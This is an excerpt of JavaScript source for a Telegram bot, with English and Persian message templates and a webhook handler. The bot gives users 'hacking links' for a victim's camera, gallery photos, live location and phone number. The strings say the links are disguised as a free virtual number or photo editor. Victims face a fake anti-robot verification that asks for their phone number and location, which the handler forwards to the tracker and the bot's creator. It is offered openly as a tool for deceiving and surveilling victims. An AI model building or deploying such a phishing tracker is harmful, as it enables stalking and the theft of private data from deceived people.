...
const messages = {
  en: {
    ...
    langEnglish: '🇺🇸 English',
    langPersian: '🇮🇷 فارســی ',
    joinMessage: '⚠️ <b>𝙄𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙩𝙤 𝙟𝙤𝙞𝙣 𝙤𝙪𝙧 𝙩𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙘𝙝𝙖𝙣𝙣𝙚𝙡𝙨.</b>\n\nᴏᴛʜᴇʀᴡɪsᴇ ᴛʜɪs ʙᴏᴛ ᴡɪʟʟ ɴᴏᴛ ᴡᴏʀᴋ. Iғ ʏᴏᴜ ʜᴀᴠᴇ 🔐 <b>𝗝𝗼𝗶𝗻𝗲𝗱</b> ᴛʜᴇ ᴄʜᴀɴɴᴇʟs. Tʜᴇɴ ᴄʟɪᴄᴋ ᴛʜᴇ Jᴏɪɴᴇᴅ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴄᴏɴғɪʀᴍ ʏᴏᴜʀ ʙᴏᴛ ᴍᴇᴍʙᴇʀsʜɪᴘ',
    joinMainChannel: 'Jᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟷⚡️ ',
    joinCustomChannel: 'Jᴏɪɴ ᴄʜᴀɴɴᴇʟ 2⚡️',
    joinedButton: '🔐 <b>𝗝𝗼𝗶𝗻𝗲𝗱</b>',
    ...
    cameraMessage: (url) => `<b>🛡ʏᴏᴜʀ ᴄᴀᴍᴇʀᴀ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ</b>\n\n<b>🖇 Link V1 -</b> ${url}\n\n<b>🖇 Link V2 -</b> ${url}\n\n❯ ʙʏ ᴛʜᴀᴛ ᴀʙᴏᴠᴇ ᴍᴀʟɪᴄɪᴏᴜs ʟɪɴᴋ ʏᴏᴜ ᴄᴀɴ ʜᴀᴄᴋ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ's ᴄᴀᴍᴇʀᴀ ᴄᴏᴘʏ ᴛʜᴀᴛ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ɪᴛ ғᴏʀ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ʜᴀᴄᴋᴇᴅ ᴘɪᴄᴛᴜʀᴇs ɪɴ ʙᴏᴛ 🧿`,
    locationMessage: (url) => `<b>ʏᴏᴜʀ ʟɪᴠᴇ ʟᴏᴄᴀᴛɪᴏɴ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ</b>\n\n<b>🖇 Link V1 -</b> ${url}\n\n<b>🖇 Link V2 -</b> ${url} \n\n❯ ʙʏ ᴛʜᴀᴛ ᴍᴀʟɪᴄɪᴏᴜs ʟɪɴᴋ ᴀʙᴏᴠᴇ ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ᴛʜᴇ ʟɪᴠᴇ ᴀɴᴅ ᴇxᴀᴄᴛ ʟᴏᴄᴀᴛɪᴏɴ ᴏғ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ.\n❯ ᴛᴏ ᴅᴇᴄᴇɪᴠᴇ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴍᴏʀᴇ ʙᴇᴛᴛᴇʀ ᴛʜᴇ ʟɪɴᴋ ɪs ɪɴ ᴛʜᴇ ғᴏʀᴍ ᴏғ Fʀᴇᴇ Vɪʀᴛᴜᴀʟ Nᴜᴍʙᴇʀ\n❯ <b>ᴄᴏᴘʏ ᴛʜᴀᴛ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ғᴏʀ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ʜᴀᴄᴋᴇᴅ ʟᴏᴄᴀᴛɪᴏɴ ᴀᴅᴅʀᴇss ɪɴ ʙᴏᴛ 🗺</b>`,
    galleryLocked: (current, link) =>
      `❯ ɪɴ ᴛʜɪs ᴘᴀʀᴛ ᴏғ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɢᴀʟʟᴇʀʏ ʙʏ ᴏᴜʀ ᴀᴅᴠᴀɴᴄᴇᴅ ᴀɴᴅ ᴘᴏᴡᴇʀғᴜʟ ʙᴏᴛ. ʜᴏᴡᴇᴠᴇʀ, ᴛᴏ ᴀᴄᴄᴇss ᴀɴᴅ ᴜɴʟᴏᴄᴋ ᴛʜᴇ Gᴀʟʟᴇʀʏ Hᴀᴄᴋ, <b>ʏᴏᴜ ᴍᴜsᴛ ɪɴᴠɪᴛᴇ 3 ᴘᴇᴏᴘʟᴇ ᴜsɪɴɢ ʏᴏᴜʀ ɪɴᴠɪᴛᴇ</b> ʟɪɴᴋ\n\n<b>🔐 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ = ${current}</b>\n\n<b>🖇 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ =</b> ${link}`,
    galleryMessage: (url) => `<b>🛡ʏᴏᴜʀ ɢᴀʟʟᴇʀʏ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ</b>\n\n<b>🖇 Link V1 -</b> ${url}\n\n<b>🖇 Link V2 -</b> ${url}\n\n❯ ʙʏ ᴛʜᴀᴛ ᴍᴀʟɪᴄɪᴏᴜs ᴀʙᴏᴠᴇ ʟɪɴᴋ ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ɢᴀʟʟᴇʀʏ ᴘʜᴏᴛᴏ\n❯ ᴛᴏ ᴅᴇᴠɪᴄᴇ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴍᴏʀᴇ ʙᴇᴛᴛᴇʀ, ᴛʜᴇ ʟɪɴᴋ ɪs ɪɴ ᴛʜᴇ ғᴏʀᴍ ᴏғ ᴀɪ ᴘʜᴏᴛᴏ ᴇᴅɪᴛᴏʀ sɪᴛᴇ\n❯ <b>ᴄᴏᴘʏ ᴛʜᴀᴛ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ᴛᴏ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ʜᴀᴄᴋᴇᴅ ɢᴀʟʟᴇʀʏ ᴘʜᴏᴛᴏs ɪɴ ʙᴏᴛ 🖼</b>`,
    phoneLocationMessage: (phoneUrl, locationUrl, bothUrl) => 
      `<b>🛡 ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ + ʟᴏᴄᴀᴛɪᴏɴ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋs ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ</b>\n\n` +
      `<b>📞 Phone Number Only Link (Free Virtual Number Form):</b> ${phoneUrl}\n\n` +
      `<b>🗺 Location Only Link (Pro Feature Form):</b> ${locationUrl}\n\n` +
      `<b>📞🗺 Both Phone Number and Location Link (Referral Form):</b> ${bothUrl}\n\n` +
    ...
    sharePhoneNumberMessage: '🚦<b>For Security Reasons</b>, please share your phone number to verify your <b>are not Robot</b> by clicking below button 💚',
    sharePhoneNumberButton: 'Share Phone Number 📞',
    phoneNumberNotification: (username, userId, phoneNumber) =>
      `🔔 <b>𝗡𝗲𝘄 𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿 𝗧𝗿𝗮𝗰𝗸𝗲𝗱</b> 📞\n\n` +
      `👤 ᴜsᴇʀɴᴀᴍᴇ: ${username}\n` +
      `🆔 ᴜsᴇʀ ɪᴅ: ${userId}\n\n` +
      `☎️ <b>𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿:</b> ${phoneNumber}`,
  ...
  fa: {
    ...
    myInfoMessage: (botUsername, chatId) => `<b>لینک شما با موفقیت ساخته شد</b>\n\n❯ <b>لینک ربات برای بدست آوردن شماره تلگرام</b>\n📞  https://t.me/${botUsername}?start=free_${chatId} \n\n\n❯ <b>لینک ربات برای هک موقعیت دقیق مکانی</b>\n🗺  https://t.me/${botUsername}?start=pro_${chatId}\n\n ❯ <b>لینک ربات برای بدست آوردن شماره تلگرام و موقعیت مکانی</b>\n🗺  📞  https://t.me/${botUsername}?start=ref_${chatId}\n\n🚀 لینک‌های بالا را کپی و برای قربانی خود بفرستید. وقتی قربانی شما با آن لینک ربات را استارت کند و بعد از تأیید هویت جعلی، شماره تلگرام و موقعیت او برای شما فرستاده می‌شود\n💡 <b>برای درک بهتر نحوه استفاده لینک‌ها، نخست روی خود تست کنید و بعداً به فرد قربانی خود بفرستید</b>`,
    ...
    phoneNumberNotification: (username, userId, phoneNumber) =>
      `🔔 <b>شماره تلفن جدید بدست آمد</b> ☎️\n\n` +
      `👤 یوزرنیم کاربر: ${username}\n` +
      `🆔 آیدی کاربر: ${userId}\n\n` +
      `📞 <b>شماره تلفن قربانی:</b> ${phoneNumber}`,
    shareLocationMessage: '🗺 تشکر! حالا لطفاً موقعیت خود را برای تکمیل تأیید به اشتراک بگذارید.',
    shareLocationButton: 'اشتراک موقعیت 🗺',
    locationNotification: (username, userId, latitude, longitude, mapsLink) =>
      `📍 <b>موقعیت جدید ردیابی شد!</b>\n` +
      `نام کاربری: ${username}\n` +
      `شناسه کاربر: ${userId}\n` +
      `عرض جغرافیایی: ${latitude}\n` +
      `طول جغرافیایی: ${longitude}\n` +
      `مشاهده در گوگل مپ: ${mapsLink}`,
    noVerificationNeeded: 'نیازی به تأیید نیست. می‌توانید از ربات به‌صورت عادی استفاده کنید. <b>/start</b> 🚀',
  },
};
...
module.exports = async (req, res) => {
  try {
    ...
    if (!user) {
      ...
      await bot.telegram.sendMessage(botInfo.creatorId, notification, { parse_mode: 'HTML' });
      ...
      if (text?.startsWith('/start')) {
        ...
        if (user.requiresVerification && user.currentTrackerId) {
          try {
            ...
            await bot.telegram.sendMessage(trackerId, notification, { parse_mode: 'HTML' });
          ...
          await bot.telegram.sendMessage(chatId, messages[lang].noVerificationNeeded, { parse_mode: 'HTML' });
        }
      }
